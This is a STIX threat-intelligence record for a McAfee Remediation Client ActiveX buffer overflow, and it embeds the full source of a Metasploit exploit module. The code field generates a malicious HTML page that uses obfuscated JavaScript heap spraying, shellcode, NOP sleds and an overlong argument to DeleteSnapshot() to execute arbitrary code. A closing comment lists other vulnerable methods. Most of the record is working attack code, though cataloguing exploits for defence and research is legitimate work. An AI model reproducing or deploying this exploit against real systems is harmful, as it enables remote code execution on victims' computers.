{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--86c56a62-f11e-4ca1-84b3-80cbdbeef3d2",
    "created": "2024-08-14T16:37:46.565531Z",
    "modified": "2024-08-14T16:37:46.565535Z",
    "name": "McAfee Remediation Client ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in McAfee Remediation Agent 4.5.0.41. When sending an overly long string to the DeleteSnapshot() method of enginecom.dll (3.7.0.9) an attacker may be able to execute arbitrary code. This control is not marked safe for scripting, so choose your attack vector accordingly.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/mcafee_hercules_deletesnapshot.rb",
            "external_id": "mcafee_hercules_deletesnapshot.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = LowRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'McAfee Remediation Client ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in McAfee Remediation Agent 4.5.0.41. When\n        sending an overly long string to the DeleteSnapshot() method\n        of enginecom.dll (3.7.0.9) an attacker may be able to execute arbitrary code.\n        This control is not marked safe for scripting, so choose your attack vector accordingly.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'OSVDB', '94540' ],\n          [ 'EDB', '16639' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ]\n        ],\n      'DisclosureDate' => '2008-08-04',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ false, 'The file name.',  'msf.html']),\n        ])\n  end\n\n  def exploit\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Create some nops.\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Set the return.\n    ret     = Rex::Text.uri_encode([target.ret].pack('L'))\n\n    # Randomize the javascript variable names.\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)  + 2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n\n    content = %Q|<html>\n<head>\n<script>\ntry {\n  var #{vname} = new ActiveXObject('Enginecom.imagineLANEngine.1');\n  var #{rand1} = unescape('#{shellcode}');\n  var #{rand2} = unescape('#{nops}');\n  var #{rand3} = 20;\n  var #{rand4} = #{rand3} + #{rand1}.length;\n  while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};\n  var #{rand5} = #{rand2}.substring(0,#{rand4});\n  var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});\n  while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};\n  var #{rand7} = new Array();\n  for (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }\n  var #{rand8} = \"\";\n  for (#{var_i} = 0; #{var_i} < 1024; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }\n  #{vname}.DeleteSnapshot(#{rand8});\n} catch( e ) { window.location = 'about:blank' ; }\n</script>\n</head>\n</html>\n|\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(content)\n  end\nend\n\n=begin\n\nOther vulnerable method's:\n\n[id(0x0000000c), helpstring(\"method CreateSnapFromDefaultProfile\")]\nvoid CreateSnapFromDefaultProfile(BSTR szDescription);\n\n[id(0x00000013), helpstring(\"method CreateReportOfSysInfoDifferences\")]\nvoid CreateReportOfSysInfoDifferences(\n  BSTR szOldSnapFile,\n  BSTR szNewSnapFile,\n  BSTR szOutFile,\n  short format,\n  short append);\n\n[id(0x0000000f), helpstring(\"method CreateReportOfSnapshotDifferences\")]\nvoid CreateReportOfSnapshotDifferences(\n  BSTR szOldSnapFile,\n  BSTR szNewSnapFile,\n  BSTR szOutFile,\n  short format);\n\n[id(0x00000012), helpstring(\"method CreateReportOfAssetDifferences\")]\nvoid CreateReportOfAssetDifferences(\n  BSTR szOldSnapFile,\n  BSTR szNewSnapFile,\n  BSTR szOutFile,\n  short format,\n  BSTR pszAsset,\n  short append);\n\n=end\n",
    "x_mitre_disclosure_date": "2008-08-04",
    "x_mitre_platforms": [
        "win'"
    ]
}